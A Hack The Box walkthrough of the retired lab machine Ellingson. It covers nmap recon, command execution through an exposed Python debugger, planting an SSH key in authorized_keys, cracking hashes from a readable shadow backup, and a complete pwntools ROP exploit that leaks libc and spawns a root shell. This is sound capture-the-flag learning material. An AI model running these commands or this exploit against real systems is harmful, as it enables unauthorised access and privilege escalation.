---
layout: post
title:  "Ellingson Walkthrough"
author: nanobyte
date:   2019-10-22
description: Hack The Box writeup for Ellingson, Retired Hard Box
tags: ROP SSH Python test
---

{% for tag in site.tags %}
      {{ tag.tags }}
{% endfor %}

Ellingson was an awesome box to root! Not only did I get to sharpen some of my ROP skills, but the throwback to one of my favorite movies (Hackers) was a treat from beginning to root. For those of you who have not seen Hackers, shame on you. Go watch it! This box was also awesome because getting the initial foothold was not the average run this flavor exploit, but really had to think out of the box for me and starting new. So, lets get started!

First off, I ran nmap against the box

{% highlight bash lineos %}
nmap -sV -sC -p- -oA ellingson.htb 10.10.10.139
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-22 10:15 CDT
Nmap scan report for 10.10.10.139
Host is up (0.066s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%),
Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A
or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds
{% endhighlight %}

Once I was able to identify what services were running, I hopped on over to the website and began to poke around while running gobuster. When I got to the /articles/ directory, I noticed the numbers incremented and so manually fuzzed. Fuzzing http://10.10.10.139/articles/5 was able to find python interactive shells. There, I had access to a python debugger!

{% highlight bash lineos %}
File "/opt/corp-web/run.py", line 32, in show_articles
slug = articles[index-1]

>>> import getpass
>>> print(getpass.getuser())
hal
{% endhighlight %}

Nice! I found I have the ability to run os system commands. During enumeration, I also found that there is Port 22 open. First, I tried to steal the SSH key, but I did not know the key passphrase. However, looking further, I can write to the authorized_keys file! Since taking the id_rsa key file on there didn’t work, let’s generate a new key, and place our pub key in there:

{% highlight bash lineos %}
import os

os.system("echo '\nssh-rsa [your RSA key] root@kali' >> /home/hal/.ssh/authorized_keys")
{% endhighlight %}

And now I can login to SSH! Awesome, initial foothold gained!

Now that we login, during further enumeration we are user Hal and need to get to user. Enumerating the system, there is a backup folder. In there, we have read permissions to shadow.bak!? Bad admin!

{% highlight bash lineos %}
cat /var/backups/shadow.bak

root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
{% endhighlight %}

Let’s crack those hashes!

{% highlight bash %}
hashcat64.exe -m 1800 -a 0 ellingsin.txt rockyou.txt --force

theplague:password123
margo:iamgod$08
{% endhighlight %}

Now that it’s cracked, let’s login as user!

{% highlight bash %}
su margo

cat /home/margo/user.txt
d0ff9e3f9da8--------------------
{% endhighlight %}

From here, I ran the linenum.sh script, and found a binary running that should NOT be there!

{% highlight bash %}
find / -perm -u=s -type f 2>/dev/null

/usr/bin/garbage
{% endhighlight %}

I tried several methods to get the binary to my box. All ways failed, until I found openssl base64! 

{% highlight bash %}
openssl base64 < garbage

//Copy output of encoded garbage

//On your machine, create garbage.input

openssl base64 -d < garbage.input > garbage.output
{% endhighlight %}

Garbage.output is now the binary on your system! For the ROP, I had to watch Bitterman's video several times, and speak woith the HTB community on Discord (if you are NOT on their channel, I highly recommend it. There is a community of hackers who really do want to help you along with nudges!). After watching the second half of the video, and chatting with a few fellow hackers, I was able to come up with the following:

{% highlight bash %}
from pwn import *

context(terminal=['tmux', 'new-window'])
session = ssh('margo', '10.10.10.139', password='iamgod$08')

p = session.process('/usr/bin/garbage')
#p = gdb.debug('./garbage', 'b main')

context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

# make sure these are local and freshly grabbed from remote with correct permissions
garbage = ELF('garbage')
rop = ROP(garbage)
libc = ELF('libc.so.6')
junk = "A" * 136

# build rop chain
rop.search(regs=['rdi'], order='regs')
rop.puts(garbage.got['puts'])
rop.call(garbage.symbols['main'])
print "ROP Chain 1:\n{}".format(rop.dump())

payload = junk + str(rop)
p.recvuntil('password:')
p.sendline(payload)
p.recvuntil('denied.')

leaked_puts_address_in_libc = p.recv()[:8].strip().ljust(8, "\x00")
print("Leaked puts@GLIBCL {}".format(str(leaked_puts_address_in_libc)))

# unpack
leaked_puts_address_in_libc = u64(leaked_puts_address_in_libc)

libc.address = leaked_puts_address_in_libc - libc.symbols['puts']
rop2 = ROP(libc)
rop2.setuid(0x0)
rop2.system(next(libc.search('/bin/sh\x00')))
print "ROP Chain 2:\n{}".format(rop2.dump())

payload = junk + str(rop2)
p.sendline(payload)
p.recvuntil('denied.')

p.clean()
p.interactive()
{% endhighlight %}

Now, once you run the binary on your local system, it will deliver root!

{% highlight bash %}
cat /root/root.txt
1cc73a448021--------------------
{% endhighlight %}
